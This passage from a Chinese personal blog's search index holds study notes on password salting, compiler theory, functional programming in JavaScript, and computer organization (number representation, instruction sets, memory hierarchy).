EOF项目本身是编译原理大作业。也满足了我写一个编译器的目标，顺便写了个存储引擎，也算有意思吧。OCaml的类型系统和语法实在是印象深刻，已经喜欢上了。","link":"/2024/05/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E7%94%A8OCaml%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AASQL%E8%A7%A3%E9%87%8A%E5%99%A8/"},{"title":"盐值加密","text":"在[[程序设计]]方面，密码等信息的加密很重要，已经有一些现成的方案来加密存储了。加密盐可以看作是用其他信息去干扰密码加密结果，从而加大破解难度。 加密盐的实现方法加密存储 输入： 密码字符串passWord 输出：盐值 salt 、密码密文passWordHash 函数：加密hash函数 其中：“盐值 salt”是在加密过程中生成的随机字符串； 可以将salt放到passWord前面作为前缀或放到passWord后面作为后缀得到新的字符串PS，即，PS = password和salt的组合串; 密码密文passWordHash = Hash加密函数(PS ); 将用户名、密码密文passWordHash和盐值salt一起保存到数据库中。 密码校验输入：密码字符串password 输出：密码校验是否成功 处理： 取出当前用户密码加密时使用的盐值salt 得到本次输入的密码password和盐值salt的组合字符串PS 得出本次输入密码的密文passwordHash= Hash加密函数(PS ); 比较passwordHash和用户最初设置的密码密文password是否一致，如果一致，则校验成功，否则校验失败。 注意事项 盐值不能太短；如果盐值只有少数两三位甚至一两位的话，攻击者完全可以穷举所有可能的盐值；关于盐值长度的一个经验值是长度至少要和hash加密函数的返回值长度保持一致。 盐值不能固定；如果系统使用了固定的盐值，那么和不加盐相当于是一回事了，攻击者完全可以使用该固定的盐值提前准备密码表；另外，相同密码对应的hash值仍然是一样的，仍然无法对密码相同这一事实进行掩饰。 不要使用能提前预知的值作为盐值；如果盐值能提前得知或提前推断出，攻击者也完全可以根据提前预知的盐值准备密码表，从而对破解的难度也增加不了多少。 每一次修改密码重新计算hash值时，要重新生成新的盐值，不要使用上次密码对应的盐值；因为如果用户密码泄露之后，盐值相应的也就泄露了，用户修改密码时，如果还沿用原来的盐值，攻击者也仍然可以根据上次的盐值提前准备密码表，从而使攻破可能性变得更高了。","link":"/2021/07/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E7%9B%90%E5%80%BC%E5%8A%A0%E5%AF%86/"},{"title":"编译原理学习笔记","text":"这东西很早就开始看，但是一直没有一个明晰的思路。说起来最早接触编译器，大概是第一次试着自己写一个计算器的时候吧。那会尝试使用递归来进行表达式的解析，现在想来很像下推自动机。准确来说现在看着像是手写下推自动机 编译器纲要编译原理的根本目的是将程序设计高级语言翻译成机器硬件控制器可直接执行的二进制代码。自顶向下观测，可以从编译的阶段流程逐步深入学习。 首先是概览，理解每个阶段的输入和输出，从黑箱角度理解每一阶段的编译器组件的功能，参考龙书。简要来说：输入是人类可读的程序语言，然后经过编译器前端和后端两个大层次的多阶段翻译，逐步转换成为语言的单词（token）集合，表示语言结构的抽象语法树，带有更多附加信息的，包含语义的语法树，中间代码（可以是三地址码等等），最终生成符合目标体系架构的原生机器代码。 或者从另一个视角来观察，CPU自身对应的就是一种有限状态模型。因此，编译的过程实质上可以理解为将一种编程模型下的程序翻译成另一种编程模型下的程序。所以实质上，软件和硬件的分界点是可以变动的，这部分的trade-off和收益暂时不展开。 其次从词法分析开始，介绍词法匹配的方法，进一步深入到本质：正则表达式（三型文法），以及NDFA，以及实质上和NDFA的表达力完全等价的DFA。这里对于自动机的定义，构造和自动机所能识别的语言的介绍，是对于语言和自动机表达力和等价性的重要讨论。 接下来是语法分析，介绍CFG和CSG，以及配套的自动机模型：下推自动机。并且证明：下推自动机PDA和DPDA（确定型下推自动机）的表达力也是一样的，并且识别的语言类型也是相同的。 这部分除了自动机，还有自上而下/自下而上分析法，以及他们下属的各种方法，比如SLR，LALR，LL(0)等方法，以及其中包含的包括跳转表等分析技术。 学到一半的感受是，对于三型文法和二型文法，都有适合他们的识别对应语言的自动机模型。理解这两种文法的识别方法，可以从理解这两种语言的自动机模型开始着手。 另外二型文法对于大多数语言来说确实够用了，一般语言识别最大的问题就是语言结构的嵌套问题，这部分理解了PDA的下推栈之后就能自己动手写出来一些简单的parser了。 语义识别的部分一般是在语法树上的非叶子节点附加操作，以及借助符号表等工具来完成。在完成这部分之后，编译器的前端部分基本就完成了。这时，可以结束开发，转而编写解释器；或者为了追求性能，继续编写以各个平台的处理器为目标产物的编译器。 编译器部分，会涉及到内存分配，链接器，地址回填等操作，算是细节很多，非常偏重实践和工业界的东西。特别是很多优化可以在体系结构无关的三地址/四地址码，以及机器相关的机器码级别完成。优化是一个NP问题，可以一直做下去。近两年也有在优化环节引入AI来进行编译优化的工作。 词法分析，状态机与正则表达式词法分析是读取输入字符流，并将它转换为 字母表 元素构成的集合 符号 构成字母表的元素。例如a,b,c是符号 符号串 符号的有穷序列。例如symbol。空符号串记作$\\epsilon$ 符号串长度 包含符号的个数。例如x=string，则有|x|=6 符号串连接 xy表示这两个符号串连接 符号串集合的乘积 AB={xy|x∈A,y∈B} 符号串的幂运算 同一个符号串的自我连接 符号串集合的幂运算 符号串集合的自我乘积 符号串集合的正闭包 是集合1到n次幂的并集 自反闭包 正闭包和空串集合的并集 通过离散数学的语言描述正则语言。 文法及其分类简介 编译流程：词法分析，语法分析，语义分析，中间代码生成，中间代码优化，目标代码生成六步。 编译程序结构：包含上面6个步骤的对应程序，以及表格处理程序，出错处理程序。 按照前后端划分，前面5个步骤属于前端，最后一个步骤属于后端，因为它依赖于特定计算机硬件系统和机器指令。 同时，编译过程也可以分为一遍和多遍。 高级语言的自编译性（自举）：允许这个语言为它自己编写编译器。自展技术可以实现这一点：它把语言分为一个核心部分和数个扩充部分。用机器语言实现核心，再用核心实现扩展功能。 编译器移植：改后端为目标机器后端生成器，然后编译生成A上运行的B编译器，再用它编译自己，就得到了B上可用的编译器。 翻译程序编写系统，是编译器/翻译器的开发工具。它也曾被称为自动程序设计系统，这一概念包含规格说明，目标语言，问题范围和采用方法等。采用方法包括知识工程等。 文法分类根据Chomsky文法分类，可以得到0,1,2,3型文法。数字越大越宽松： 0：每个产生式的左部和右部都包含于N和T全并集的闭包中，且至少有一个非终结符 1（上下文有关语言CSG）：除了空产生式，均有左侧小于等于右侧 2（上下文无关语言CFG）：产生式左部只能是非终结符 3（正规语言RG）：产生式右部的非终结符统一出现在最左端/最右端 越强的语法（编号越小）的自动机越难构造。程序设计语言大多是CSG，但是我们一般用CFG描述程序设计语言，将上下文有关的部分单独分离为语义分析的部分。 语法分析语法分析相比词法分析使用的有穷自动机NDFA/DFA，它使用下推自动机。这种自动机模型更强一些，有部分计数功能。 下推自动机 自动机原型是图灵机。其核心模型是状态转换和状态修改。 在有限状态控制器上添加了一个信息/状态保存栈。因此，它有简单的计数能力。 下推自动机的原理实际上就是给DFA增加了一个数据栈。形式化地说，接受三型文法的DFA的形式化定义如下： $$DFA A = A(Q, \\Sigma, \\delta, q_0, F)$$ 其中： $Q$：状态的有穷集合 $\\Sigma$：输入符号的有穷集合 $\\delta$：转移函数$\\delta(q, a)$ $q_0$：自动机的初始状态 $F$：自动机接受状态/终结状态的集合 那么，下推自动机PushDown Automation的形式化定义就是： $$PDA P = P(Q, \\Sigma, \\Gamma, \\delta, q_0, Z_0, F)$$ 其中： $Q$：状态的有穷集合 $\\Sigma$：输入符号的有穷集合 $\\Gamma$：有限的堆栈字符表 $\\delta$：转移函数，是三元函数$\\delta(q, a, X)$，三个变量分别是$Q$中的状态，$\\Sigma$中的输入符号或者空串$\\epsilon$，$\\Gamma$中的堆栈符号 $q_0$：自动机的初始状态 $Z_0$：自动机堆栈的初始符号 $F$：自动机接受状态/终结状态的集合 语法分析方法自上而下语法分析简单的说，就是不断选取产生式，尝试从根节点推导出和当前串$w$匹配的串。 从语法树的根到叶去建立语法树。步骤是试探+回溯，边推导边匹配。对输入序列，使用产生式进行最左推导，直到得到一个合法句子/非法结构。随后从左到右扫描输入序列，自上而下建立语法树。 最大的问题是左递归，即非终结符同时出现在左部和右部左侧，会造成死循环。消除方法为引入新的非终结符进行同义转化。直接消除左递归的方法可以使用通用的算法进行解决。 另一个问题是消除文法二义性。直接的消除方法不适用于自上而下分析方法。 还有一个问题是公共前缀的提取。该行为能有效优化选择速度，提升性能和错误恢复能力。方法是引入新的非终结符来表示公共前缀的推导，再改写原来的产生式。 自下而上语法分析简而言之就是，从串$w$着手，不断在其中寻找能用产生式规约的部分，并不断地进行规约操作。 下面是GPT的介绍： 自下而上语法分析（bottom-up parsing）是一种从输入的最底层符号开始，逐步构造出高层结构的语法分析方法。它的目标是通过合并输入符号和中间结果，最终构造出整个输入的语法树。LR分析器是自下而上语法分析的典型代表之一。 我们用一个简单的例子来说明自下而上语法分析的过程。假设我们有以下的语法规则： S → AB A → a B → b 这里，S、A、B 是非终结符，a、b 是终结符。我们的输入字符串是 “ab”。 我们从输入字符串的第一个符号开始，将每个符号视为一个单独的子树： 初始状态：输入字符串 “ab” 被表示为 [a, b]。 匹配并规约第一部分 我们检查字符串并尝试应用规则 A → a。 输入字符串中第一个符号是 a，符合规则 A → a。 我们将 a 规约为 A。 此时，输入状态变为 [A, b]。 匹配并规约第二部分 接下来，我们检查字符串并尝试应用规则 B → b。 输入字符串中第二个符号是 b，符合规则 B → b。 我们将 b 规约为 B。 此时，输入状态变为 [A, B]。 匹配并规约整个字符串 现在，我们尝试应用规则 S → AB。 当前输入状态是 [A, B]，符合规则 S → AB。 我们将 [A, B] 规约为 S。 此时，输入状态变为 [S]。 此时，输入字符串已被规约为 S，表示输入字符串 “ab” 是该语法的一个有效句子。 根据上述规约过程，我们可以构造出对应的语法树： 12345 S / \\ A B / \\a b 有几种基于自上而下的识别方法，比如LALR和SLR。","link":"/2024/01/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/compiler-note/"},{"title":"函数式编程范式","text":"对于大部分场合而言，优化不需要过早，到了需要优化的时候自然会意识到必要性。过早的优化只会带来负担。 最近JS写多了，都快不会写算法题了。其实不怪JS，只是绝大多数具体业务的实现一般很少需要用到什么重要算法。不过我遇到的问题是代码写烦了：这里写一坨那里写一坨，写一些忘一些，最后就成了一大坨，看着多但是实际功能并没多少。这让我想到了代码表达力的问题，于是我开始寻找方法去提高代码的表达力：写更少的代码，实现更多的功能。代码变得紧凑对于检查和维护来说也能降低一部分负担。 于是，我自然而然地正式接触到了函数式编程。对于当前的需求，这似乎就是答案。 介绍 下面这段是我和LLM一块写的 函数式编程（Functional Programming）是一种编程范式，区别于命令式编程关注指令和操作，函数式编程更加关注函数本身，函数的组合、副作用，流程和代码可读性。函数作为一等公民，基本上可以在任何位置上出现。它关注函数的施用，而非具体操作的实现。这种编程风格强调将数据抽象为函数，将函数作为基本构建块来构建复杂的计算。函数式编程的优势包括：可读性、可维护性、可重用性等。 首先为啥叫函数式，因为函数就是核心，一切围绕函数展开。刚上手时，我对它的印象就是 12data.map(...).filter(...).reduce(...)data.forEach(...) 这样的。只用这几个函数对数据进行操作就能完成大部分数据操作，这对于处理各种返回值得到裁剪/过滤过的目标数据而言，十分高效简洁。在这两个例子里边，代码将数据处理作为一个流程对待，我们只需要描述如何处理这个数据源，以及处理的规则，其他的都无需我们参与。同样的需求，使用命令式编程，我们需要： 12345let processed=[]for(let i=0;i&lt;data.length;i++){ if (MATCHING_COND) processed.push(data[i])} 为什么？因为上面的map，reduce，filter和forEach等都是高阶函数，它们可以被应用于数据源，接受一个函数作为参数，并使用函数处理数据。它们封装了常用的处理数据的流程，比如map会将数据的每一项使用传入的函数进行变换，并将它输出到新的数组中；filter会使用传入函数处理每一项，根据返回值是否为真将数据放入一个新的数组中并返回，等等。每一个高阶函数都是对于一个具体的数据处理流程的抽象描述，而这部分就是传统的命令式编程难以解决的问题——它们关注具体指令，你需要依靠具体的指令来解决你面对的问题，并自己编写具体的处理过程。 在上面传统的解决方法中，我们创建了变量processed，创建了用于循环的变量i，还使用了循环并规定了循环的结束条件，在循环体中规定了将结果加入循环的条件和流程。这些操作都在函数式操作中被抽象成了若干个高阶函数，我们无需再关心具体如何实现map和filter等操作，更不用自己去管理其中的状态（比如循环变量和用于保存中间处理结果的变量），实现了降本增效用少量代码完成常见需求，并减少了我们花费在状态管理（循环变量的创建，自增，临时变量的创建和改变等）和具体实现上的细节，而让我们只专注于和任务本身相关的部分。 并且，我们使用传递参数的方式将它们组合在一起，而非通过继承将它们耦合在一起。这一点意味着函数式编程降低了代码的耦合度，并且提高了代码的复用率：比起来面向对象按照类，通过继承进行复用，函数式编程将复用粒度降低到函数的级别，这也显著减少了无用代码。不过继承除了复用，还有规范和约束实现的作用。函数式编程如何解决这个问题我暂时还不太清楚。不过函数式编程，面向对象编程以及元编程，这三者属于是几乎正交的关系，所以完全可以交叉使用没啥问题。 另外还有一点上面的例子并没有表现出来，那就是关于副作用这一点。这个说法应该和不可变这一点放在一起来讲：上面的循环变量i就是一个可变的变量，循环的副作用就是改变了这个变量的值。再比如C指针的经典例子：通过swap交换两个变量的值，这就是一个典型的有副作用的函数，它改变了传入参数的值。函数式编程之所以排斥这样做，就是因为它在尽量避免函数的副作用，试图将所有函数变为纯函数：函数的执行结果只依赖于输入的值，而和外部状态无关，并且不改变外部的状态。它借此消除副作用带来的不确定性。而数据的不可变是它消除不确定性的另一个方法，这里就是函数式编程的精髓了：没有可变变量要怎么迭代/处理数据？不用迭代了，用递归就行。使用递归也提供了另一个观察问题的方式，比如对上面的迭代筛选例子，我们就可以用递归来改写，从而避免使用循环变量i： 123456789let processed=[]const iter=(data) =&gt; { if(data.length==0) return; else{ if(data[0] MATCHES_COND) return data[0] + iter(data[1:]); return iter(data[1:]) }} 上面的代码没用任何可变变量，也完成了数据源的筛选。虽然初次接触不太好想，但是解决大部分问题时，另一种视角确实有时会有意想不到的便利。以及不可变变量的好处也挺多的，比如天然没有竞争和并发问题。 另外关于递归的性能问题，用尾递归可以在受到递归优化的编程语言中得到不输迭代的性能。比如经典的斐波那契数列计算函数，就可以通过尾递归的写法结合语言的优化，达到和迭代写法基本一致的性能。 下边这例子是LLM写的，暂时没验证 123456789101112131415161718192021222324252627// 定义一个高阶函数，用于计算两个数的和function sum(a, b) { return a + b;}// 使用高阶函数组合两个函数，用于计算两个数的和function calculator() { return sum;}// 调用高阶函数组合器，并传入两个数字作为参数const add = calculator();// 调用高阶函数组合器，并传入两个数字作为参数const subtract = calculator(a =&gt; a - b);// 调用高阶函数组合器，并传入两个数字作为参数const multiply = calculator(a =&gt; a * b);// 调用高阶函数组合器，并传入两个数字作为参数const divide = calculator(a =&gt; a / b);// 测试计算器函数console.log(add(2, 3)); // 输出 5console.log(subtract(5, 2)); // 输出 3console.log(multiply(2, 3)); // 输出 6console.log(divide(10, 2)); // 输出 5 组合组合和继承，都是复用代码的重要手段。组合简洁，继承稍微冗杂一些。 组合的概念就是将一些现有的单元组合到一起，形成新的工具去解决具体问题，而组合这个动作的适用对象就不止是函数那么简单了。它可以是函数的组合，可以是类型的组合，也可以是状态和函数的组合。 借从某大佬那里偷来的一个说法，大多数新的语法结构就是让人们更合理地去使用固定范式的GOTO，而Algebraic Effect就是其中最合理那个佬最推崇的一个。从我的视角看来，主流编程语言的演进都是朝着可读可写且尽可能兼顾效率的方向发展的。在这个过程中，损失的一部分就是语言的”Tricks”，或者说是语言的灵活性/可能性等。比如GOTO受到的接连削弱，它从一个十分灵活的结构变成了一堆固定但是更理智的语法结构，以一部分灵活性为代价换取了语言的可读性，以此提升可维护性。 组合呢？组合也是一种对于GOTO的封装。甚至更底层的，汇编中的GOTO，（部分）也就是jmp，它在汇编中也有对应的封装：子程序。而这些说法，对于指针这个原始的内存模型中的概念同样适用。封装提高了可读性，限制GOTO的直接使用限制了代码的可写性。二者的矛盾在足够优秀的语法结构出现前基本上是一对难以调和的矛盾。","link":"/2023/12/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/functional-thinking/"},{"title":"计组笔记：第一章-绪论","text":"学时：78+20+1周学分：5.5类型：必修参考书-教材：计算机组成与系统结构（十二五·第二版）、计算机组成原理（王闵，电子工业出版社，2001），计算机系统结构（李学干，西电，2001），深入理解计算机系统（机械工业出版社）考核：期末考试，期中考试（&gt;40课时）-80%、作业，测验，出勤-10%、实验（5个）-10%动机：不是专业基础课，但是有助于对计算机的理解和问题解决要求：做笔记，纸质优先 ![[Pasted image 20221219100518.png]] 计算机硬件基本组成计算机的物理硬件有很多，不过可以大致划分为几类。作为现代计算机原型的冯诺依曼机，其结构可作如下划分： 输入设备 可以是磁盘，键盘，摄像头等设备控制器运算器 负责进行运算存储器 包含寄存器等输出设备 可以是网卡等I/O设备 也可以说是三部分：中央处理器，存储器，I/O 计算机中的数据流动计算机的最主要用途是数据处理（借助运算器）。处理结果发送到输出设备。数据流向是从输入设备到运算器再到输出设备。在这过程中，可能会借助存储器（CPU存储空间不太大），因此运算器和存储器有交换。数据还会从运算器到控制器。这就是数据流。 对应的还有控制流。控制器控制输入设备，运算器，存储器，输出设备。它控制硬件协调方式。 还有指令流的说法。指令从存储器到指令，控制器对其解析并执行。 冯式架构计算机特点 内部进行二进制运算 无论数值数据是什么类型都会以二进制模式处理。非数值数据也会以二进制模式存储。指令在编译之后也会变成二进制文件，供控制器解析执行 存储程序 控制程序会预先存储在控制器中供后续执行 程序控制 计算机由程序控制运行 早期计算机并非如此。比如以前的进制有十进制的，也有手动控制的计算机，有些计算机的程序是以硬件固定表示的。但是现在的计算机已经由以前的专用机进化成为如今的冯诺依曼通用机。 后续的讲解会按照冯式机的结构展开。上面的冯式机结构是经过一定抽象的，下面是PC机的结构。 总线挂载内存，处理器，I/O。总线包含三种线：控制线（传输控制指令，比如读写等），数据线（传输数据），地址线（传输地址）。 内存中的东西是一段一段存储的。每个最小单元大小是字节，若干字节构成一个段。段有指令段，数据段等。 以计算1+2为例，CPU向内存发送x地址和读取指令，内存将值发送给CPU（取址）；对于y执行同样操作。然后，CPU计算1+2（执行），再将结果和地址还有写指令发送给内存，内存完成写入（写回）。 以前的PC机是南北桥结构。北桥链接高速设备（CPU，内存，显卡等），南桥链接低速设备（I/O，外接设备等）。相对于CPU寄存器而言，内存速度低几个数量级，因而在CPU内设Cache，映射内存中最常用区域。命中率越高处理器使用率越高。Cache目前按照速度递减空间递增分为L1，L2，L3。内存不够时，也可以把硬盘的一部分作为虚拟的内存使用，这软件实现类似上面硬件实现的Cache。 计算机层次结构自上而下可以分为这么几层 高级语言（应用层）（程序设计语言） 汇编语言（一种助记符）（微机原理） 机器语言（二进制码） 硬件结构 逻辑电路（构成硬件结构）（数电+模电） 计组的讲解范围是机器语言和硬件结构。操作系统在汇编语言和机器语言之间。编译原理在前三层间。 机器语言和硬件结构之间有指令集（ISA）。一般有Intel X86，ARM等。 计算机分类和性能描述计算机分类法传统分类有按体积分类，现在已经不用；另一种是按照用途分为通用机和嵌入式计算机。前者包含 个人计算机 服务器 超级计算机 后者应用广泛。 更常用的是Flynn分类法：根据三种数据流分类。有 单指令流单数据流（SISD） SIMD MISD：无现实例子 MIMD 计算机性能描述 性能指标 MIPS（百万指令数每秒）等 测试程序 Amdahl定律 升级硬件后，系统的加速比和这硬件的使用频率/使用时间占比有关，所谓好钢用在刀刃上。加速比定义： $$S_p=\\frac{T_\\text{改进前}}{T_\\text{改进后}}$$ 计算时用下式： $$S_p=\\frac{1}{(1-f)+\\frac{f}{s}}$$ f是改进的部分占比，s是这硬件提升的倍数。若f取40%，对s取极限可以得到极限整体提升为1.66。因此可以得到结论：部分系统优化若趋近于极限，则边际效应递减。此外，f越大，整体提升越大。正所谓“抓住主要矛盾”。 计算机发展史 早期工作 Charles Babbage： 差分机，分析机 内存、打孔卡片、CPU George Boole： 布尔代数：0 1 Claude Shannon： Switching theory 开关理论 第一代电子计算机 ABC，1942 最早的电子计算机 真空管，280","link":"/2022/12/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%BB%AA%E8%AE%BA/"},{"title":"计组笔记：第二章-计算机数据表示","text":"重点是定点数和浮点数的表示。数制啥的就不说了，主要还有原码补码反码这几个。下面的讨论都是对于二进制数而言的，因为计算机存储的结构以二进制保存原始值。 定点数也就是小数点位置不动的数。有两种，纯整数（小数点在最右侧）、纯小数（小数点在最左侧）。分为有/无符号数，前者具有原码、反码、补码、移码四种编码表示。 有符号数的最高位为符号位，0正1负。 原码反码和补码 原码：正数是其二进制本身；负数是符号位为1,数值部分取X绝对值的二进制。 反码：正数的反码和原码相同；负数是符号位为1,其它位是原码取反。 补码：正数的补码和原码，反码相同；负数是符号位为1，其它位是原码取反，未位加1。（或者说负数的补码是其绝对值反码未位加1） 移码：将符号位取反的补码（不区分正负） 补码为什么是反码加1？因为它的目的就是为了把减法运算变成加法运算。用表举例子，加上8小时就等于减去4小时（从位置上来看）。二进制也是一样，比如4位二进制数，它的模值就是16，也就是10000。因此，一个数的补就是10000减去这个数，也就是这个数的反码再加1。 补码加减法 在做补码加减法时，只需将符号位和数值部分一起参与运算，并且将符号位产生的进位丢掉即可 补码加法公式 [X+Y]补 ＝ [X]补 + [Y]补 补码减法公式 [X-Y]补 = [X]补-[Y]补 = [X]补 + [-Y]补其中：[-Y]补称为负补,求负补的办法是：对补码的每一位(包括符合位)求反，且未位加1. 浮点数类似科学计数法的表示法：$F=M\\times 2^E$，$M$称为尾数，$E$称为阶码。 计算机中常见的浮点数存储方式为：数符 阶符 阶码数值部分 尾数数值部分。 编码表示 尾数$M$必须是小数，用$n+1$位定点小数表示，可用原码、补码。 阶码$E$必须为整数，以$k+1$位有符号定点整数表示，可用原码、补码、移码。 浮点数编码位数为$m=(n+1)+(k+1)$ 规格化浮点数对尾数无限制可能使得存储空间利用不充分，因此使用规格化形式表示。 定义 将尾数（记为$M$）的绝对值限定在规定的数值范围内：$1/2 \\leq |M| \\lt 1$，这样的浮点数就是规格化浮点数。实现这一点很简单，下面的尾数以补码表示： $M \\geq 0$：$M=0.1\\times\\times\\times\\cdots\\times$ $M \\lt 0$：$M=1.0\\times\\times\\times\\cdots\\times$ 浮点数溢出IEEE754标准 参数 单精度浮点数 双精度浮点数 浮点数长度 32 64 尾数长度$f$ 23 52 符号位$s$ 1 1 指数$e$长度 8 11 单精度浮点数$$N=(-1)^S\\times 2^{e-127}\\times 1.f$$ IEEE754可以表示规格化浮点数，也可以表示非规格化浮点数。它表示越接近0的数越精确，越接近正负无穷的数越不准确。 浮点数存储目前计算机主要推行小端存储：浮点数的四个字节从低位到高位分别存储在计算机内存地址的低位到高位。 大小端判断12345void type(){ union{float a; char b;} i; i.a=1; printf(&quot;%d&quot;, i.b);} 如果输出1，则说明计算机是小端存储。 浮点数模型表示范围思考题 已知迷你754编码规则如上，求它的表示范围。 BCD编码典型的有8421码，这四个数字是位权。还有非位权码，比如余3码，格雷码等。 非数值编码ASCII，GB2312，GBK，还有兼容Unicode-2的编码。汉字编码用了变长数据，技术上类似于霍夫曼编码。 校验码传输过程中，检验数据是否有丢失/错误的一种检验手段。 奇偶校验码只有一位校验位，在数据的最高位。它表示数据中包括校验位在内的位的1的个数是奇数还是偶数。前者校验位为1，后者为0。 CRC冗余循环校验码","link":"/2023/02/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/"},{"title":"计组笔记：第五章-指令系统","text":"指令是硬件和软件的中间层。指令系统的设计主要包括指令功能和指令格式的设计。它的评价指标有四点：完备（不能缺少功能）、高效（省地方一点）、规整（格式简单一点）、兼容性（向后兼容，无成本迁移）四方面。 指令的基本格式 主要是两部分，首先是操作码，其次是数个地址（0个或多个）。将二进制编码用助记符表示，就是汇编语言。 计算机的存储方式有大端存储（从数据的高字节开始存）、小端存储（从数据的低字节开始存） 此外还有边界对齐的概念。如图所示： 还有一种存储模式，堆栈。这里的堆栈应该就是栈，堆和栈是俩不一样的东西，堆是存程序malloc的内存的，栈是存程序函数调用开销的，这俩在程序的内存中存储的位置也不一样。 存储模式也有两类：冯诺依曼结构（程序和数据等价）、哈佛结构（程序和数据不对等）。后者对于流水线结构有优化，能达到流水线的理想性能。现在的芯片内部Cache有的会使用哈佛结构：数据Cache、指令Cache，而外部使用冯诺依曼结构。 指令的典型分类 数据传送类：频率最高，要快 算数运算类 逻辑运算类 程序控制类 转移 循环 过程调用、返回指令 程序自中断指令 系统控制类：特权指令，虚存管理、任务切换、改变处理器工作模式 数据转换类：可选 输入输出类：根据统一编址（把接口的寄存器映射到主存，用数据传输指令访问外设）和独立编址，可能没有专门的输入输出指令。 寻址方式：指令获取操作数的方式 隐含寻址：例如Intel指令MUL BL，事先规定好了地址在哪 立即寻址： 寄存器寻址： 直接寻址： 间接寻址：操作数地址的地址，需要访问两次主存，比较慢 寄存器间接寻址：把上面的地址放在CPU内部寄存器 基址寻址：用来实现主存分段 变址寻址：用来实现数组遍历 PC相对寻址：PC指向下一条指令，这个方式给PC加偏移量，所以能用来实现与地址无关的程序设计 例如，x86处理器的条件转移指令就是一种PC相对寻址。 无关位置的程序实现： 虚存管理：逻辑地址 内存分段管理：段内偏移 上面两种方案的缺点是位数多，占用指令存储空间大。 指令长度设计 一般原则 指令长度为存储器最小可寻址单位的整数倍：（CISC）（x86） 指令长度一般为总线宽度的整数倍：RISC 常用设计方案 变长操作码，变长指令码：CISC（x86） 定长操作码，定长指令码：RISC MIPS，6位定长操作码，32位定长指令码 RISC-V，7位定长操作码，32位定长指令码 操作码格式分为定长、变长操作码，变长操作码为了防止重复指令，得用赫夫曼编码来编制操作码。 定长操作码 对于定长操作码，可以将指令从高频到低频排序，依次给从0开始编号。 优点：操作码构造简单，硬件设计简单，译码速度快 缺点：操作码占存储空间大，难以扩展 变长操作码 对于变长操作码，按照频率高到低排序，再构造霍夫曼树作为编码结果。 变长操作码设计原则： 若指令字长度固定，则长地址码对应短操作码，操作码长度随地址码长度缩短而增加 如果指令字长度可变，则以指令使用频率为设计依据，高频短码，低频长码 设计总是从短码开始，并且保证现在的操作码和以后扩展的编码能区分 短码不能是长码的前缀 根据赫夫曼编码的合并方式不同，得到的结果可能不唯一，但是平均码长一定是唯一的 缺点：编码长度种类过多，电路设计困难 扩展操作码 是将赫夫曼编码的码长变为更少的种类。 可以看到，它编码种类较少的同时，码长也很接近赫夫曼编码。因此实际设计时，一般使用这种设计方式。比如CISC的x86就可以这么设计。 上面是两种设计方式。一个长度的指令码必须保留一种组合给更长的指令码做前缀。 因此，上面的操作码可以设计如下： 三地址：操作码6位，指令数$n_3\\leq2^6-1$ 双地址：操作码11位，指令数$n_2\\leq(2^6-n_3)\\cdot2^5-1$ 单地址：操作码16位，指令数$n_1\\leq((2^6-n_3)\\cdot2^5-n_2)\\cdot2^5-1$ 零地址：操作码32位，指令数$n_0\\leq(((2^6-n_3)\\cdot 2^5 - n_2)\\cdot2^5-n_1)\\times2^{16}$ 对于上面的问题，相当于计算单地址指令一共有多少个。我们分析如下： 由上图的不等式能解出来，B类指令最多一共有254条。 上题还是从短码开始考虑。首先短码有m条，则剩下的前缀有$2^4-m$个。再乘以长码扩展的长度$2^6$，就能得到长码最多的个数。 5.6.典型指令系统Intel x86发展：从诞生时的80条指令增长到2015的3600条指令（来源Intel博客）。 十分复杂，指令集手册5000多页（ 目前在向着RISC的方向均衡。它十分适合高性能计算。 MIPSARM手册也长，8000多页（ 32位MIPS 64位MIPS，14种指令格式 MIPS是arm流行之前，最流行的处理器。 这一章基本就是这样了。","link":"/2023/06/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/"},{"title":"计组笔记：第四章-存储系统","text":"4.1.概述CPU通过总线，和系统中各部分组件相连接。和它连接的硬件，其中就有一组由各部分组件构成的一个存储系统。此外还有其他通过“接口”和总线相连接的外设。接口中有着一些可编程部分，它们负责统一总线通信协议。 BIOS存储在一个固化的存储芯片中，负责引导系统开机。引导系统加载后，它跳转到系统的内存位置，结束任务。操作系统则负责加载自己的其余部分。 在这个过程中，CPU先从Flash取指令，再从主存MM中取指令，其中也会从硬盘加载指令来执行。 4.1.1.存储系统的层次结构系统的存储体系属于金字塔型多级结构。从寄存器到Cache，MM，ROM，磁盘，设备的存储速度逐步下降，价格也逐步下降，存储空间也逐步增加。而这整个体系对于CPU而言是一个完整的体系，它们具有寄存器的速度，也具有磁盘的大容量。这就是依靠存储体系实现的。典型的存储体系是一个三层结构。 存储器的三大要求：大容量、高速度、低成本。这三者往往是矛盾的。 本章的重点是Cache部分 